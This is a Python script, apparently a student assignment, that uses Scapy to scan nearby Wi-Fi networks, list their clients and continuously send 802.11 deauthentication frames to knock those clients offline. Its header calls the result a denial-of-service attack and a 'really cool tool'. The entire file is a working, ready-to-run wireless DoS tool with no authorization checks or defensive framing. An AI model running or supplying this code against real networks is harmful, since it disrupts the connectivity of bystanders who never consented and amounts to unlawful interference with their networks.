#*******
# Walt
# csc842
# 21Jul24
# Scans BSSIDs in the area, then deauth all clients continuously
# for a selected BSSID, thus creating a DOS attack to selected clients. Really cool Tool!
# ********
import argparse
import logging
import os
import random
import sys
import time
from scapy.all import *
from threading import Thread, Event

# Suppress scapy runtime warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Global variables
stop_event = Event()
stop_sniffing = False

# Channel hopper process
def channel_hopper(interface, stop_event):
    while not stop_event.is_set():
        channel = random.randint(1, 13)
        os.system(f"iwconfig {interface} channel {channel}")
        time.sleep(5)  # Increased to 5 seconds for stability

# Function to add networks from sniffed packets
def add_network(pkt, known_networks):
    if pkt.haslayer(Dot11Elt):
        essid = pkt[Dot11Elt].info.decode(errors='ignore') if b'\x00' not in pkt[Dot11Elt].info and pkt[Dot11Elt].info != b'' else 'Hidden SSID'
        bssid = pkt[Dot11].addr3
        if pkt.type == 0 and pkt.subtype == 8:  # Beacon frame
            try:
                channel = int(pkt[Dot11Elt:3].info[0])
            except TypeError:
                channel = 'Unknown'
            if bssid not in known_networks:
                known_networks[bssid] = (essid, channel)
                print(f"{channel:5}\t{essid:30}\t{bssid:30}")

# Function to add clients from sniffed packets
def add_client(pkt, clients, target_bssid):
    if pkt.haslayer(Dot11):
        bssid = pkt[Dot11].addr3
        if bssid == target_bssid and pkt.type == 2:  # Data frame
            client = pkt.addr1 if pkt.addr1 != bssid else pkt.addr2
            if client and client != 'ff:ff:ff:ff:ff:ff':  # Check for valid client address
                if bssid in clients:
                    clients[bssid].add(client)
                else:
                    clients[bssid] = {client}
                print(f"Client {client} detected on BSSID {bssid}")

# Sniffing filter to stop when stop_event is set
def keep_sniffing(pkt):
    return not stop_event.is_set()

# Function to send deauth packets
def send_deauth(client, bssid):
    packet = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
    send(packet, verbose=False)

# Perform Deauth Attack
def perform_deauth(bssid, clients, continuous):
    print(f'Sending Deauth to all clients from {bssid}')
    if continuous:
        print('Press CTRL+C to quit')
    while continuous or clients:
        try:
            threads = []
            for client in clients:
                t1 = Thread(target=send_deauth, args=(client, bssid))
                t2 = Thread(target=send_deauth, args=(bssid, client))
                t1.start()
                t2.start()
                threads.append(t1)
                threads.append(t2)
            for thread in threads:
                thread.join()
            if not continuous:
                break
        except KeyboardInterrupt:
            break

# Main execution
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Utilize many wireless security features using the Scapy python module')
    parser.add_argument('-i', '--interface', type=str, required=True, help='Interface to use for sniffing and packet injection')
    args = parser.parse_args()
    conf.iface = args.interface

    networks = {}
    clients = {}
    
    dSniffTime = 120   # 120 seconds = 2 minutes (adjustable)
    print('Sniffing for %d minutes...' % (dSniffTime/60) )  # time and msg
    print('=' * 100 + '\n{0:5}\t{1:30}\t{2:30}\n'.format('Channel', 'ESSID', 'BSSID') + '=' * 100)

    # Start channel hopping thread
    channel_hop = Thread(target=channel_hopper, args=(args.interface, stop_event))
    channel_hop.start()

    start_time = time.time()
   
    try:
        # Sniff for x minutes
        while time.time() - start_time < dSniffTime:
            sniff(iface=args.interface, prn=lambda x: add_network(x, networks), store=0, timeout=10)
        # Set the stop event to end sniffing
        stop_event.set()
        channel_hop.join()
        print("\nSniffing stopped.")
    except KeyboardInterrupt:
        print("\nSniffing interrupted.")
        stop_event.set()
        channel_hop.join()

    # Display available networks and prompt for user selection
    if networks:
        print('\nAvailable Networks:')
        for idx, (bssid, (essid, channel)) in enumerate(networks.items()):
            print(f"{idx + 1}: Channel {channel:5}, ESSID {essid:30}, BSSID {bssid}")

        try:
            choice = int(input('Select a network by number to perform a deauth attack (0 to quit): '))
            if choice == 0:
                sys.exit(0)
            selected_bssid = list(networks.keys())[choice - 1]
        except (IndexError, ValueError):
            print('Invalid selection. Exiting...')
            sys.exit(1)

        print(f'Changing {args.interface} to channel {networks[selected_bssid][1]}')
        os.system(f"iwconfig {args.interface} channel {networks[selected_bssid][1]}")

        print('Sniffing for clients...')
        stop_event.clear()
        clients[selected_bssid] = set()
        sniff(iface=args.interface, prn=lambda x: add_client(x, clients, selected_bssid), store=0, timeout=300)
        
        if clients[selected_bssid]:
            continuous = input('Perform continuous deauth attack? (y/n): ').strip().lower() == 'y'
            perform_deauth(selected_bssid, clients[selected_bssid], continuous)
        else:
            print('No clients found for the selected BSSID.')
    else:
        print('No networks detected.')
